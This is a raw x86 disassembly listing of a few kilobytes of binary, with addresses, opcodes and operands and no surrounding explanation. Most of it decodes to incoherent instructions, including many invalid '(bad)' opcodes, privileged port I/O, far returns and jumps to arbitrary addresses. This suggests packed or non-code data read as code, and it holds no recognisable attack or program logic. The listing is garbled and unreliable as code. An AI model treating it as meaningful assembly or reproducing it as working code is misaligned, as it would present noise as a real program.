  495edc:	mov    esp,0x80ebec23
  495ee1:	aam    0xfa
  495ee3:	sbb    DWORD PTR [edx+0x71581833],eax
  495ee9:	ja     0x495eab
  495eeb:	and    ah,ah
  495eed:	pop    es
  495eee:	mov    esi,0x85c4b24f
  495ef3:	repz loopne 0x495f01
  495ef6:	jecxz  0x495f0d
  495ef8:	xchg   dh,al
  495efa:	or     eax,0x10da4711
  495eff:	or     esi,eax
  495f01:	or     eax,0xe281b670
  495f06:	add    edi,esi
  495f08:	(bad)  
  495f09:	push   cs
  495f0a:	retf   
  495f0b:	rcl    DWORD PTR [ebx-0x725f7e8f],1
  495f11:	sbb    ebp,DWORD PTR [ebx]
  495f13:	mov    bh,0x81
  495f15:	cs loopne 0x495f09
  495f18:	retf   0x6373
  495f1b:	and    BYTE PTR [ebp-0x504ff9de],ch
  495f21:	dec    ebp
  495f22:	or     DWORD PTR [ebx+edi*2-0x2b],edi
  495f26:	(bad)  
  495f28:	call   0x8367a52e
  495f2d:	(bad)  
  495f2e:	loopne 0x495fa7
  495f30:	adc    edx,ebp
  495f32:	or     ah,BYTE PTR [ebp-0x58]
  495f35:	stos   BYTE PTR es:[edi],al
  495f36:	jae    0x495f6a
  495f38:	sbb    DWORD PTR [edi-0x3e],ecx
  495f3b:	sti    
  495f3c:	xor    al,BYTE PTR [ebx+0x1e683d]
  495f42:	inc    ecx
  495f43:	test   BYTE PTR [edx-0x2d94bc40],0xbd
  495f4a:	push   es
  495f4b:	xchg   ebp,eax
  495f4c:	out    0x5,eax
  495f4e:	inc    eax
  495f4f:	adc    al,0x10
  495f51:	(bad)  [eax]
  495f53:	or     al,0xc4
  495f55:	adc    al,0x94
  495f57:	add    DWORD PTR [edi+0x193d800b],eax
  495f5d:	push   cs
  495f5e:	aam    0xdd
  495f60:	sub    ch,BYTE PTR [edi+eax*2-0x251148bf]
  495f67:	imul   esp,DWORD PTR [esi+0x3a6fe0f0],0x74
  495f6e:	dec    ebp
  495f6f:	push   edi
  495f70:	jmp    0x495fa2
  495f72:	add    edx,DWORD PTR [esi+0x64]
  495f75:	xchg   BYTE PTR [eax+0x20],dh
  495f78:	scas   eax,DWORD PTR es:[edi]
  495f79:	shl    BYTE PTR [ebx],0x1f
  495f7c:	loopne 0x495f2f
  495f7e:	sbb    esp,DWORD PTR [ebp+0x69]
  495f81:	inc    eax
  495f82:	std    
  495f83:	je     0x495fa2
  495f85:	pop    ss
  495f86:	push   es
  495f87:	shl    esi,0x54
  495f8a:	jbe    0x495f57
  495f8c:	pop    ds
  495f8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495f8e:	outs   dx,BYTE PTR ds:[esi]
  495f8f:	in     al,dx
  495f90:	add    DWORD PTR [edi-0x1d14ea74],edx
  495f96:	das    
  495f97:	adc    BYTE PTR ds:0xcaac1210,cl
  495f9d:	sbb    bl,BYTE PTR fs:[esi-0x34c4b89e]
  495fa4:	jbe    0x496009
  495fa6:	adc    BYTE PTR [ecx+edx*8+0x38],bh
  495faa:	das    
  495fab:	jmp    0x495fee
  495fad:	and    dh,cl
  495faf:	fadd   DWORD PTR [ebx+edi*1]
  495fb2:	inc    ebp
  495fb3:	les    esi,FWORD PTR [ebx+ecx*1-0x75]
  495fb7:	pop    esp
  495fb8:	mov    bh,BYTE PTR [eax-0xff647d7]
  495fbe:	pop    DWORD PTR [ecx]
  495fc0:	sbb    DWORD PTR [ebp+0x3c],ecx
  495fc3:	je     0x495fd9
  495fc5:	or     al,0x80
  495fc7:	mov    ecx,DWORD PTR ds:0x3125aa9
  495fcd:	fist   WORD PTR [ebx+0x69]
  495fd0:	xor    eax,0xd4e98b61
  495fd5:	adc    esp,DWORD PTR [ebp+0x7bc92291]
  495fdb:	jmp    0x2d6f28a8
  495fe0:	lea    eax,[ebx-0x6f18e3e4]
  495fe6:	retf   0x2073
  495fe9:	adc    al,0x10
  495feb:	sbb    al,0xf8
  495fed:	pop    ds
  495fee:	push   edx
  495fef:	sbb    bh,BYTE PTR [esi+eax*8+0x7f]
  495ff3:	jle    0x496031
  495ff5:	cmp    edi,0xe34a28f0
  495ffb:	inc    edx
  495ffc:	jle    0x496032
  495ffe:	outs   dx,DWORD PTR ds:[esi]
  495fff:	and    dh,ch
  496001:	add    dl,0xb2
  496004:	je     0x495fc0
  496006:	loopne 0x495f96
  496008:	inc    eax
  496009:	xor    BYTE PTR [edx],bh
  49600b:	pop    esi
  49600c:	pop    ebx
  49600d:	push   edi
  49600e:	in     eax,0x87
  496010:	adc    dh,bl
  496012:	adc    esi,DWORD PTR [ecx+eax*1]
  496015:	shl    DWORD PTR [ebp-0x6f],cl
  496018:	xor    BYTE PTR [ecx],0x89
  49601b:	sbb    BYTE PTR [ecx-0x15ab97ad],ch
  496021:	lods   eax,DWORD PTR ds:[esi]
  496022:	(bad)  
  496023:	push   ebx
  496024:	shr    esp,1
  496026:	inc    edx
  496027:	ret    
  496028:	pop    esp
  496029:	and    eax,0xad68c524
  49602e:	in     al,0xa7
  496030:	call   0x1d0de345
  496035:	or     cl,al
  496037:	mov    al,ds:0x5663791b
  49603c:	leave  
  49603d:	leave  
  49603e:	dec    ecx
  49603f:	fld    TBYTE PTR ds:0x100c080e
  496045:	mov    bh,0xdb
  496047:	enter  0x14c9,0x18
  49604b:	ss sbb eax,0x27240f20
  496051:	daa    
  496052:	daa    
  496053:	daa    
  496054:	sub    BYTE PTR [eax+esi*1],ch
  496057:	xor    al,0x9
  496059:	daa    
  49605a:	daa    
  49605b:	daa    
  49605c:	sbb    al,0x38
  49605e:	cmp    al,0x6e
  496060:	daa    
  496061:	ins    DWORD PTR es:[edi],dx
  496062:	bound  ebx,QWORD PTR ds:0x44402440
  496068:	cmovs  ecx,DWORD PTR [esi+0x4e]
  49606c:	dec    esi
  49606d:	dec    esi
  49606e:	dec    esp
  49606f:	push   eax
  496070:	push   esp
  496071:	pop    eax
  496072:	xchg   ebx,eax
  496073:	xchg   ebx,eax
  496074:	xchg   ebx,eax
  496075:	or     eax,DWORD PTR ds:0x9364605c
  49607b:	xchg   ebx,eax
  49607c:	xchg   ebx,eax
  49607d:	xchg   ebx,eax
  49607e:	push   0xca74706c
  496083:	ret    0x9390
  496086:	js     0x496104
  496088:	dec    ecx
  496089:	es imul ecx,edi,0x84141be3
  496090:	mov    BYTE PTR [esi],ah
  496092:	cdq    
  496093:	fs xchg edx,eax
  496095:	mov    WORD PTR [eax+0x64999894],ss
  49609b:	xchg   edx,eax
  49609c:	dec    ecx
  49609d:	pushf  
  49609e:	mov    al,ds:0x499264a4
  4960a3:	es test al,0xbc
  4960a6:	rcl    BYTE PTR [ebx-0x3b66d9b7],0xc8
  4960ad:	int3   
  4960ae:	cdq    
  4960af:	ss leave 
  4960b1:	add    al,0x65
  4960b3:	sar    BYTE PTR [eax-0x6d9b27eb],1
  4960b9:	dec    ecx
  4960ba:	es fsubr st(0),st
  4960bd:	in     al,0x92
  4960bf:	dec    ecx
  4960c0:	es cdq 
  4960c2:	call   0x269335b3
  4960c7:	cdq    
  4960c8:	fs lock hlt 
  4960cb:	clc    
  4960cc:	xchg   ebx,eax
  4960cd:	sbb    al,0x72
  4960cf:	xchg   edx,eax
  4960d0:	cld    
  4960d1:	add    BYTE PTR [ecx],al
  4960d3:	add    al,0x8
  4960d5:	imul   edx,ebx,0x65018206
  4960db:	or     al,0x31
  4960dd:	adc    BYTE PTR ds:0x92649926,dl
  4960e3:	adc    al,0x18
  4960e5:	sbb    al,0x20
  4960e7:	cdq    
  4960e8:	fs xchg edx,eax
  4960ea:	dec    ecx
  4960eb:	and    al,0x28
  4960ed:	sub    al,0x64
  4960ef:	xchg   edx,eax
  4960f0:	dec    ecx
  4960f1:	xor    BYTE PTR es:[eax+edi*1],dh
  4960f5:	or     ah,BYTE PTR fs:[esi]
  4960f8:	cdq    
  4960f9:	cmp    al,0x40
  4960fb:	gs inc esp
  4960fd:	leave  
  4960fe:	mov    ah,0x3
  496100:	cdq    
  496101:	dec    eax
  496102:	dec    esp
  496103:	mov    DWORD PTR [eax+0x24],edx
  496106:	xchg   ebx,eax
  496107:	dec    esp
  496108:	xor    dl,BYTE PTR [eax+ebx*2+0x5c]
  49610c:	pop    es
  49610d:	mov    ch,0x30
  49610f:	leave  
  496110:	pusha  
  496111:	sbb    BYTE PTR [ebp+0x74],bh
  496114:	add    DWORD PTR [edx+0x7],0xffffffa4
  496118:	pop    ecx
  496119:	pushf  
  49611a:	add    eax,0xc252a6d2
  49611f:	jle    0x4960c8
  496121:	add    al,0x22
  496123:	mov    ebp,cs
  496125:	test   BYTE PTR [ebx+edx*1],dh
  496128:	or     BYTE PTR [eax+0x2e45b830],dl
  49612e:	jg     0x496150
  496130:	jbe    0x496166
  496132:	cmp    esi,DWORD PTR ds:0x6d7656bc
  496138:	add    ecx,DWORD PTR [ecx+0x2192ddd1]
  49613e:	ins    DWORD PTR es:[edi],dx
  49613f:	inc    edx
  496140:	call   0xd298:0x2210940c
  496147:	dec    esp
  496148:	dec    eax
  496149:	xor    edx,DWORD PTR [esp+ebx*4]
  49614c:	sbb    BYTE PTR [eax+0x133484cd],ah
  496152:	sbb    al,0xa4
  496154:	and    BYTE PTR [eax+0x2133484c],ch
  49615a:	and    al,0xac
  49615c:	cmp    BYTE PTR [ecx],ah
  49615e:	add    eax,0x3cc0d213
  496163:	cli    
  496164:	(bad)  
  496165:	ror    BYTE PTR [eax+ecx*2+0x33],cl
  496169:	inc    eax
  49616a:	enter  0xcc44,0xcd
  49616e:	test   BYTE PTR [ebx+edx*1],dh
  496171:	dec    eax
  496172:	ror    BYTE PTR [esp+edx*8+0x5a],1
  496176:	or     eax,0x2583217c
  49617b:	or     al,0x92
  49617d:	add    bl,al
  49617f:	dec    esp
  496180:	enter  0x9bfe,0xf3
  496184:	enter  0x418b,0x6c
  496188:	push   0xffffff86
  49618a:	xchg   esp,eax
  49618b:	push   edi
  49618c:	outs   dx,BYTE PTR ds:[esi]
  49618d:	ret    
  49618e:	adc    BYTE PTR [ebx+0x75705115],cl
  496194:	add    eax,0x9f526291
  496199:	mov    cl,0x3f
  49619b:	mov    cl,0xb6
  49619d:	je     0x496128
  49619f:	rol    DWORD PTR [eax],0xa8
  4961a2:	bound  esp,QWORD PTR [eax]
  4961a4:	popa   
  4961a5:	add    DWORD PTR [eax+0x2],eax
  4961a8:	or     bl,BYTE PTR [edx+eax*4]
  4961ab:	push   cs
  4961ac:	pop    edi
  4961ad:	sub    al,0x9a
  4961af:	stos   DWORD PTR es:[edi],eax
  4961b0:	add    al,0x24
  4961b2:	jmp    0x4961a5
  4961b4:	mov    ds:0xe71342df,al
  4961b9:	cmp    ch,BYTE PTR [esi]
  4961bb:	fmul   QWORD PTR [edx+0x76c63506]
  4961c1:	sbb    al,bl
  4961c3:	xor    al,0xa3
  4961c5:	jae    0x4961b5
  4961c7:	add    al,ah
  4961c9:	and    BYTE PTR [ebx],al
  4961cb:	push   ds
  4961cc:	dec    eax
  4961cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4961ce:	psllw  mm0,QWORD PTR [ecx]
  4961d1:	outs   dx,BYTE PTR ds:[esi]
  4961d2:	inc    edx
  4961d3:	inc    edi
  4961d4:	mov    fs,WORD PTR [esi+0x2e90f2b9]
  4961da:	retf   0x3b5d
  4961dd:	ret    
  4961de:	cmp    edi,ebx
  4961e0:	ja     0x496164
  4961e2:	or     esi,DWORD PTR [eax+0x2b]
  4961e5:	gs (bad) 
  4961e7:	sub    ah,al
  4961e9:	imul   eax,DWORD PTR ds:0xd372552a,0x15
  4961f0:	fld    DWORD PTR [esp+ebp*2-0x1d]
  4961f4:	dec    edx
  4961f5:	add    esi,edi
  4961f7:	jne    0x49620c
  4961f9:	mov    edx,DWORD PTR [edi]
  4961fb:	inc    ebx
  4961fc:	(bad)  
  4961fd:	fild   WORD PTR [edx-0x76]
  496200:	or     cl,BYTE PTR [eax+0x3a42160c]
  496206:	retf   
  496207:	je     0x49622b
  496209:	dec    edi
  49620a:	jne    0x4961ff
  49620c:	sbb    dl,dh
  49620e:	sub    esi,eax
  496210:	push   esi
  496211:	dec    eax
  496212:	call   0xe5ded16
  496217:	mov    BYTE PTR [ecx],dl
  496219:	inc    ecx
  49621a:	cmp    dl,bl
  49621c:	je     0x496226
  49621e:	dec    edi
  49621f:	xor    al,0x4d
  496221:	jle    0x496283
  496223:	push   edi
  496224:	test   BYTE PTR [ebx-0x77fd7612],bh
  49622a:	sbb    DWORD PTR [esi-0x75],edi
  49622d:	ja     0x4962a4
  49622f:	comiss xmm0,DWORD PTR [ecx]
  496232:	out    dx,eax
  496233:	and    eax,0x85c88a5
  496238:	jmp    DWORD PTR [edx-0x26d5f94c]
  49623e:	out    dx,al
  49623f:	scas   eax,DWORD PTR es:[edi]
  496240:	test   al,0xab
  496242:	add    ch,0x28
  496245:	loopne 0x496243
  496247:	leave  
  496248:	push   ebp
  496249:	add    eax,0x74be0bbe
  49624e:	xor    ebp,DWORD PTR [ebp+0x26]
  496251:	add    ch,bl
  496253:	loop   0x496246
  496255:	or     bl,bh
  496257:	jmp    0x4961fe
  496259:	or     edx,DWORD PTR [esi]
  49625b:	push   es
  49625c:	inc    eax
  49625d:	test   BYTE PTR [ecx-0xd],ah
  496260:	fs adc esi,eax
  496263:	add    al,BYTE PTR [eax]
  496265:	mov    cl,0x88
  496267:	loope  0x496274
  496269:	pop    es
  49626a:	(bad)  
  49626b:	imul   edi,DWORD PTR [edi+0x1041f20f],0x14
  496272:	mov    cl,0xc
  496274:	icebp  
  496275:	lea    eax,[esi+0x41]
  496278:	push   ds
  496279:	add    BYTE PTR [edi-0x3f494c01],0xbe
  496280:	xchg   esp,eax
  496281:	pop    esi
  496282:	xchg   edx,eax
  496283:	push   cs
  496284:	push   0xa12f464e
  496289:	push   eax
  49628a:	jl     0x4962c0
  49628c:	outs   dx,BYTE PTR ds:[esi]
  49628d:	xor    eax,DWORD PTR [eax-0x46]
  496290:	dec    esp
  496291:	or     BYTE PTR [ebp+0x11],bl
  496294:	sub    DWORD PTR [ecx],ebp
  496296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  496297:	dec    esi
  496298:	lock sub al,0x7e
  49629b:	push   esp
  49629c:	adc    dh,BYTE PTR [esi-0x68]
  49629f:	cmp    al,0x5f
  4962a1:	std    
  4962a2:	shl    BYTE PTR [eax+ecx*2],0x8
  4962a6:	aaa    
  4962a7:	push   ebx
  4962a8:	adc    eax,0xb794f7a1
  4962ad:	shr    bl,1
  4962af:	lds    esi,FWORD PTR [ebp-0x3cc41ce9]
  4962b5:	cmp    esi,DWORD PTR [ebx-0x67]
  4962b8:	mov    cl,BYTE PTR [eax]
  4962ba:	push   es
  4962bb:	adc    eax,0x5f659a6
  4962c0:	lock jbe 0x4962ac
  4962c3:	or     eax,0x6ad2d2d2
  4962c8:	add    DWORD PTR [eax+0x15],ebp
  4962cb:	mov    dl,0x6a
  4962cd:	add    esi,DWORD PTR [edi]
  4962cf:	test   BYTE PTR [ebp+0x2294512],dl
  4962d5:	cs and al,0x3c
  4962d8:	int3   
  4962d9:	push   0x2
  4962db:	dec    edi
  4962dc:	xor    eax,0x58
  4962df:	push   ebp
  4962e0:	imul   esp,DWORD PTR [edx+edi*1],0x21
  4962e4:	or     al,0xae
  4962e6:	sub    al,0xcc
  4962e8:	push   edi
  4962e9:	cmp    ah,BYTE PTR [eax-0x5853eb90]
  4962ef:	or     cl,BYTE PTR [edx]
  4962f1:	jmp    DWORD PTR [eax+0x60]
  4962f4:	sbb    al,0x5e
  4962f6:	pusha  
  4962f7:	call   0xbcb1e071
  4962fc:	inc    ebx
  4962fd:	pusha  
  4962fe:	inc    ecx
  4962ff:	mov    WORD PTR [ebx],es
  496301:	pop    esp
  496302:	in     al,dx
  496303:	outs   dx,BYTE PTR ds:[esi]
  496304:	add    ecx,DWORD PTR [edx]
  496306:	pop    ds
  496307:	lock and DWORD PTR [ebx+ecx*4],edi
  49630b:	cmp    eax,0x29b90951
  496310:	pop    esp
  496311:	mov    al,0x34
  496313:	sub    al,0xbd
  496315:	and    eax,0xfad07298
  49631a:	push   es
  49631b:	dec    edi
  49631c:	push   0xbae674b9
  496321:	mov    al,ds:0x3a89a331
  496326:	pop    ds
  496327:	mov    WORD PTR [eax-0x48],ds
  49632a:	sbb    DWORD PTR [esi+ecx*1+0x70],0x5c
  49632f:	mov    ds:0xbe7b1264,eax
  496334:	neg    DWORD PTR [edx]
  496336:	repnz push 0x6027a358
  49633c:	mov    eax,ds:0x1fc49b08
  496341:	mov    BYTE PTR [eax+0x13],bh
  496344:	push   es
  496345:	es loop 0x496327
  496348:	dec    esi
  496349:	and    al,0xeb
  49634b:	(bad)  
  49634c:	je     0x496380
  49634e:	push   edi
  49634f:	je     0x496390
  496351:	inc    edx
  496352:	push   DWORD PTR ds:0x7139091c
  496358:	adc    al,0x66
  49635a:	mov    dh,BYTE PTR [edi]
  49635c:	push   eax
  49635d:	mov    BYTE PTR [edx+0x4],cl
  496360:	sub    al,0xa6
  496362:	sub    BYTE PTR [ecx-0x5eff63ae],al
  496368:	sbb    DWORD PTR [esi+0x38668c32],ebx
  49636e:	sbb    BYTE PTR [edx+ebp*1],dh
  496371:	push   eax
  496372:	shl    DWORD PTR [ebx+0x72718728],cl
  496378:	idiv   BYTE PTR [eax+eax*4+0x44558e83]
  49637f:	dec    ebp
  496380:	and    BYTE PTR fs:[eax],al
  496383:	push   0x25c217a1
  496388:	je     0x4963cb
  49638a:	cmp    edi,DWORD PTR [esi-0x24afd68c]
  496390:	xchg   ecx,eax
  496391:	fucomi st,st(6)
  496393:	and    BYTE PTR [edx+0x5ca177ec],0x33
  49639a:	(bad)  
  49639c:	mov    ebp,0xecee112a
  4963a1:	cmp    esp,ebx
  4963a3:	push   esp
  4963a4:	fcmovb st,st(0)
  4963a6:	mov    BYTE PTR [eax+0x27],bh
  4963a9:	jp     0x4963ec
  4963ab:	jp     0x4963b6
  4963ad:	out    dx,eax
  4963ae:	pop    edi
  4963af:	cmp    DWORD PTR [esi-0x70],esp
  4963b2:	sbb    BYTE PTR [eax-0x77],0xb
  4963b6:	jmp    0x4963b0
  4963b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4963b9:	mov    ds:0xd2066d16,eax
  4963be:	mov    edx,esi
  4963c0:	cmp    WORD PTR [edx],0xf
  4963c4:	mov    bh,BYTE PTR [esi+0x40]
  4963c7:	ds ret 0x7c02
  4963cb:	hlt    
  4963cc:	stos   BYTE PTR es:[edi],al
  4963cd:	out    0x2b,eax
  4963cf:	lods   al,BYTE PTR ds:[esi]
  4963d0:	in     eax,0xb5
  4963d2:	adc    cl,0x7f
  4963d5:	or     bh,BYTE PTR [eax+0xfc72171]
  4963db:	ret    0xbaa
  4963de:	mov    esi,0x78f5a66d
  4963e3:	push   ds
  4963e4:	fs jle 0x4963f3
  4963e7:	or     BYTE PTR [ebx],al
  4963e9:	jne    0x4963ff
  4963eb:	mov    eax,ds:0x67eca94
  4963f0:	adc    al,0xdf
  4963f2:	or     eax,0x62190d89
  4963f7:	sbb    BYTE PTR [ecx+0x764b4bd2],ch
  4963fd:	push   ss
  4963fe:	add    bh,0x26
  496401:	xchg   DWORD PTR [edx-0x7340978],eax
  496407:	sub    eax,0x733a12ce
  49640c:	or     BYTE PTR [edx-0x18],bl
  49640f:	xor    BYTE PTR [eax-0x5],al
  496412:	std    
  496413:	rol    al,cl
  496415:	mov    ecx,0x830f8910
  49641a:	pop    esi
  49641b:	ss mov ecx,0xb71b0660
  496421:	retf   
  496422:	mov    eax,0x518d8232
  496427:	or     bl,dl
  496429:	jae    0x496432
  49642b:	push   esi
  49642c:	std    
  49642d:	and    ebx,eax
  49642f:	fisubr WORD PTR [ebx]
  496431:	rcl    DWORD PTR [eax+esi*8+0x39],0x41
  496436:	jb     0x49641b
  496438:	mov    ecx,0xdf240966
  49643d:	daa    
  49643e:	mov    ecx,0x8dcd2b2b
  496443:	dec    edx
  496444:	jbe    0x49646d
  496446:	pop    ss
  496447:	or     DWORD PTR [edx+esi*1-0x38],0xffffffb9
  49644c:	add    esp,DWORD PTR [ebp-0x1be6f211]
  496452:	nop
  496453:	add    BYTE PTR [ecx-0x7f25b125],dl
  496459:	adc    BYTE PTR [esi],0x6a
  49645c:	ror    BYTE PTR [ecx+eax*8],cl
  49645f:	scas   al,BYTE PTR es:[edi]
  496460:	or     eax,0x5f33d73b
  496465:	arpl   WORD PTR [ecx-0x3534b8d1],bp
  49646b:	mov    ch,0x4b
  49646d:	xchg   ecx,eax
  49646e:	xchg   ebx,eax
  49646f:	das    
  496470:	push   eax
  496471:	push   cs
  496472:	inc    ecx
  496473:	fisub  WORD PTR [eax+ebx*8+0x72]
  496477:	jnp    0x4964d4
  496479:	sbb    DWORD PTR [esi],esp
  49647b:	addr16 jle 0x496493
  49647e:	xchg   ebp,eax
  49647f:	lahf   
  496480:	add    eax,0x5350c183
  496485:	jbe    0x4964d7
  496487:	jnp    0x49647a
  496489:	(bad)  
  49648a:	jbe    0x49640f
  49648c:	mov    WORD PTR [eax+eax*2+0x10],?
  496490:	cmp    eax,0x17e02bdb
  496495:	sub    dl,BYTE PTR [ebp+0x7f2746c3]
  49649b:	(bad)  
  49649e:	adc    ebp,DWORD PTR ds:0x306f87bc
  4964a4:	jmp    0x4964ab
  4964a6:	mov    edx,0xaa34d71a
  4964ab:	or     esp,DWORD PTR [ebx]
  4964ad:	add    DWORD PTR [esi],ecx
  4964af:	mov    ebx,0x7a271363
  4964b4:	adc    eax,0xc8fe4c40
  4964b9:	or     cl,BYTE PTR [eax+eiz*4]
  4964bc:	push   ds
  4964bd:	inc    edx
  4964be:	mov    al,0x6
  4964c0:	loopne 0x4964c6
  4964c2:	mul    ecx
  4964c4:	int3   
  4964c5:	push   ebx
  4964c6:	or     bh,BYTE PTR [esi+esi*4+0x0]
  4964ca:	jb     0x496499
  4964cc:	dec    eax
  4964cd:	adc    esp,ecx
  4964cf:	add    edx,ebx
  4964d1:	pop    ebx
  4964d2:	fs adc al,0x28
  4964d5:	and    ebp,edi
  4964d7:	and    DWORD PTR [ebx+0x1d05bab0],esi
  4964dd:	adc    BYTE PTR [edi+0x56],dl
  4964e0:	cld    
  4964e1:	inc    edi
  4964e2:	mov    eax,ds:0xac82855a
  4964e7:	pop    ecx
  4964e8:	mov    dh,0x11
  4964ea:	scas   al,BYTE PTR es:[edi]
  4964eb:	mov    dl,0x94
  4964ed:	dec    esi
  4964ee:	push   ecx
  4964ef:	adc    bh,dl
  4964f1:	jmp    0x49653d
  4964f3:	mov    WORD PTR [eax],fs
  4964f5:	xor    al,0x0
  4964f7:	mov    bh,0xfc
  4964f9:	xor    al,0x7
  4964fb:	mov    ebp,0x724f2ccb
  496500:	push   eax
  496501:	adc    ebx,DWORD PTR [edi-0x7a65b8f5]
  496507:	inc    esi
  496508:	or     ebx,ebp
  49650a:	iret   
  49650b:	test   ebx,edx
  49650d:	sbb    esi,DWORD PTR [ecx]
  49650f:	inc    ecx
  496510:	fcom   DWORD PTR [ebp+0x30]
  496513:	dec    ebx
  496514:	js     0x4964c8
  496516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  496517:	sbb    esp,eax
  496519:	ror    ebx,cl
  49651b:	dec    DWORD PTR [edx+0x66]
  49651e:	add    dl,al
  496520:	jge    0x496502
  496522:	ja     0x496540
  496524:	jbe    0x4964c6
  496526:	rcl    BYTE PTR [edx-0x40],0xd3
  49652a:	sub    al,0xf5
  49652c:	out    dx,eax
  49652d:	into   
  49652e:	add    BYTE PTR [eax+eax*1+0x7f],cl
  496532:	sar    DWORD PTR [edi],1
  496534:	push   edx
  496535:	imul   edx,DWORD PTR [esi],0xff08d5c
  49653b:	movsx  ecx,BYTE PTR [ecx+esi*1+0x4]
  496540:	cmp    dl,BYTE PTR [edx-0x1e7cfb1a]
  496546:	push   eax
  496547:	sbb    al,0x23
  496549:	dec    ebx
  49654a:	nop
  49654b:	push   cs
  49654c:	and    ah,ch
  49654e:	(bad)  
  49654f:	test   eax,0x87859
  496554:	jmp    0x49656f
  496556:	ins    DWORD PTR es:[edi],dx
  496557:	fiadd  DWORD PTR [edi-0x7f]
  49655a:	add    al,0x65
  49655c:	aas    
  49655d:	cmc    
  49655e:	cmc    
  49655f:	mov    ebx,DWORD PTR [eax-0x75]
  496562:	adc    BYTE PTR [ebx],ch
  496564:	and    BYTE PTR [ecx+0x6b],0x4
  496568:	push   ds
  496569:	lea    esi,[eax]
  49656b:	xor    DWORD PTR [ecx-0x79f5a398],0xba19bd63
  496575:	add    BYTE PTR [esi+0xd7a41aa],bl
  49657b:	dec    eax
  49657c:	mov    eax,ds:0xc7fef137
  496581:	inc    ecx
  496582:	js     0x4965be
  496584:	dec    edi
  496585:	loop   0x496575
  496587:	imul   eax,DWORD PTR [edx],0xffffff8d
  49658a:	inc    ecx
  49658b:	adc    al,0x34
  49658d:	and    al,0xe4
  49658f:	add    dl,bl
  496591:	sub    ebx,DWORD PTR [eax-0x60]
  496594:	popa   
  496595:	add    al,0xd8
  496597:	add    eax,ecx
  496599:	push   ebp
  49659a:	sbb    bl,BYTE PTR [ebp+edi*4-0x6d]
  49659e:	or     DWORD PTR [edi-0x5d],eax
  4965a1:	mov    ah,0x86
  4965a3:	sub    edi,DWORD PTR [ebx]
  4965a5:	fisubr WORD PTR ds:0x11002a8c
  4965ab:	pop    eax
  4965ac:	pop    ebp
  4965ad:	push   edx
  4965ae:	shl    DWORD PTR [eax+0x1],cl
  4965b1:	inc    eax
  4965b2:	in     eax,dx
  4965b3:	mov    al,ds:0x3b02cb03
  4965b8:	clc    
  4965b9:	push   edi
  4965ba:	xor    ebx,DWORD PTR [eax+0x27]
  4965bd:	xchg   ebp,eax
  4965be:	adc    dh,bl
  4965c0:	add    edi,DWORD PTR [ebx+0x271834c6]
  4965c6:	lea    esp,cs:[edx]
  4965c9:	das    
  4965ca:	test   BYTE PTR [esi],dl
  4965cc:	or     eax,0x8ac3988b
  4965d1:	inc    eax
  4965d2:	and    al,0x6d
  4965d4:	cmp    esi,DWORD PTR [eax]
  4965d6:	icebp  
  4965d7:	and    al,0x7f
  4965d9:	cmp    al,0x2
  4965db:	mov    ecx,0x25169179
  4965e0:	int    0x15
  4965e2:	add    DWORD PTR [edi+0x1045d23f],ebx
  4965e8:	fiadd  WORD PTR [eax+0x45325d74]
  4965ee:	hlt    
  4965ef:	push   0x5
  4965f1:	push   ebp
  4965f2:	push   edx
  4965f3:	lar    ebx,ax
  4965f6:	sbb    ecx,ebp
  4965f8:	fimul  DWORD PTR [ebx]
  4965fa:	ret    0xd907
  4965fd:	jmp    0x49665c
  4965ff:	mov    ah,0x7d
  496601:	push   es
  496602:	jecxz  0x49660e
  496604:	jecxz  0x4965f6
  496606:	jle    0x496638
  496608:	mov    al,ds:0x768b1278
  49660d:	push   ebx
  49660e:	sbb    ch,dl
  496610:	les    edi,FWORD PTR ds:0xb90ed0f4
  496616:	push   cs
  496617:	rol    BYTE PTR [eax-0x3d],0xe
  49661b:	test   BYTE PTR [eax],ah
  49661d:	out    dx,eax
  49661e:	hlt    
  49661f:	jg     0x4965e1
  496621:	test   al,0x47
  496624:	cmp    ebx,DWORD PTR [esi+0x7c]
  496627:	shl    BYTE PTR [ebx+ebp*8+0x20],1
  49662b:	add    DWORD PTR [esi+0x4],0xfffffffe
  49662f:	js     0x49663e
  496631:	clc    
  496632:	fwait
  496633:	test   BYTE PTR [ebp+0xdeb770b],al
  496639:	cmp    BYTE PTR [ecx+0x6152421b],0x2
  496640:	and    BYTE PTR [edx],dl
  496642:	and    ah,bh
  496644:	push   esp
  496645:	loop   0x496688
  496647:	mov    eax,ecx
  496649:	xchg   DWORD PTR [eax+0x28],edx
  49664c:	mov    ch,0x6a
  49664e:	fdiv   QWORD PTR [ecx+0xa]
  496651:	inc    esp
  496652:	outs   dx,BYTE PTR ds:[esi]
  496653:	add    cl,BYTE PTR [esp+edx*4+0x61]
  496657:	adc    cl,dh
  496659:	adc    edx,DWORD PTR [eax+0x4]
  49665c:	cmp    dl,BYTE PTR ds:0x1e38105a
  496662:	ss xchg esp,eax
  496664:	lock mov dl,0xf3
  496667:	dec    edx
  496668:	add    BYTE PTR [eax-0x54],ch
  49666b:	inc    ebp
  49666c:	lahf   
  49666d:	shl    BYTE PTR [eax],1
  49666f:	xchg   esp,eax
  496670:	std    
  496671:	inc    ecx
  496672:	jmp    0x755dbeb0
  496677:	push   ds
  496678:	dec    ecx
  496679:	pop    edx
  49667a:	adc    DWORD PTR [eax+0x4a0e2aab],ecx
  496680:	test   DWORD PTR [ecx],0xca49e0cd
  496686:	retf   
  496687:	out    dx,eax
  496688:	xor    al,0x6
  49668a:	cmp    eax,0x5f74df89
  49668f:	jge    0x496701
  496691:	mov    ecx,DWORD PTR [eax+0x8014fac]
  496697:	loope  0x49665e
  496699:	(bad)  
  49669a:	jle    0x4966c1
  49669c:	mov    dh,0x7c
  49669e:	and    BYTE PTR [ebx],dh
  4966a0:	sar    BYTE PTR [edx+0x7caf8780],cl
  4966a6:	xchg   ebp,eax
  4966a7:	ret    0x5e52
  4966aa:	push   ecx
  4966ab:	add    eax,0xd9c093f7
  4966b0:	pop    esi
  4966b1:	pop    edx
  4966b2:	adc    al,0x10
  4966b4:	cmp    esp,DWORD PTR [ebp-0x19]
  4966b7:	ss add bh,al
  4966ba:	jb     0x4966dc
  4966bc:	cmp    BYTE PTR [esi+0x2e],bl
  4966bf:	mov    eax,DWORD PTR [eax+0x4e95d819]
  4966c5:	es inc ecx
  4966c7:	mov    ah,0x34
  4966c9:	mov    eax,ds:0x2af01748
